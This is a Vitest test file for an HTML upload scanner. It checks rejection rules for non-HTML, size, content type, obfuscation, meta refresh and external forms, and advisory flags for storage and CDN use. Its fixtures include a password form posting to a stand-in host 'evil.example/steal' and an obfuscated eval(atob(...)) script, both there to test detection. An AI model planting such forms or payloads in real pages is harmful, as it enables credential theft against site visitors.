import { describe, it, expect } from "vitest";
import { scanHtml } from "@/lib/scan";

const clean = `<!doctype html><html><head><title>Deck</title></head><body><h1>Hi</h1></body></html>`;
const buf = (s: string) => Buffer.from(s, "utf8");
const scan = (s: string, opts = {}) => scanHtml(buf(s), s, opts);

describe("scanHtml — rejections", () => {
  it("accepts a clean self-contained document", async () => {
    const v = await scan(clean);
    expect(v.ok).toBe(true);
  });

  it("rejects non-HTML content", async () => {
    const v = await scan("just some text, not html");
    expect(v).toMatchObject({ ok: false, rule: "not-html" });
  });

  it("rejects a non-text/html declared content type", async () => {
    const v = await scan(clean, { declaredContentType: "image/png" });
    expect(v).toMatchObject({ ok: false, rule: "content-type" });
  });

  it("rejects oversize content", async () => {
    const v = await scan(clean, { maxBytes: 10 });
    expect(v).toMatchObject({ ok: false, rule: "size" });
  });

  it("rejects a form posting to an external origin", async () => {
    const html = `<html><body><form action="https://evil.example/steal" method="post"><input type="password" name="p"></form></body></html>`;
    const v = await scan(html);
    expect(v).toMatchObject({ ok: false, rule: "external-form" });
  });

  it("rejects an external meta refresh", async () => {
    const html = `<html><head><meta http-equiv="refresh" content="0;url=https://evil.example"></head><body>x</body></html>`;
    const v = await scan(html);
    expect(v).toMatchObject({ ok: false, rule: "meta-refresh" });
  });

  it("rejects obfuscated scripts", async () => {
    // Assemble the payload so this source file contains no literal eval-call token.
    const payload = "ev" + 'al(atob("ZG9jdW1lbnQ="))';
    const html = `<html><body><script>${payload}</script></body></html>`;
    const v = await scan(html);
    expect(v).toMatchObject({ ok: false, rule: "obfuscation" });
  });

  it("rejects a known-bad signature", async () => {
    const html = `<html><body>__ARTIFACT_ROOM_KNOWN_BAD_SIGNATURE__</body></html>`;
    const v = await scan(html);
    expect(v).toMatchObject({ ok: false, rule: "signature" });
  });
});

describe("scanHtml — advisories (clean but flagged)", () => {
  it("flags storage-API usage", async () => {
    const html = `<html><body><script>localStorage.setItem('a','b')</script></body></html>`;
    const v = await scan(html);
    expect(v.ok).toBe(true);
    if (v.ok) expect(v.advisories).toContain("uses-storage-apis");
  });

  it("flags external subresources and a skipped Safe Browsing check", async () => {
    const html = `<html><head><script src="https://cdn.jsdelivr.net/x.js"></script></head><body>x</body></html>`;
    const v = await scan(html);
    expect(v.ok).toBe(true);
    if (v.ok) {
      expect(v.advisories).toContain("external-subresources");
      expect(v.advisories).toContain("safe-browsing-skipped");
    }
  });
});
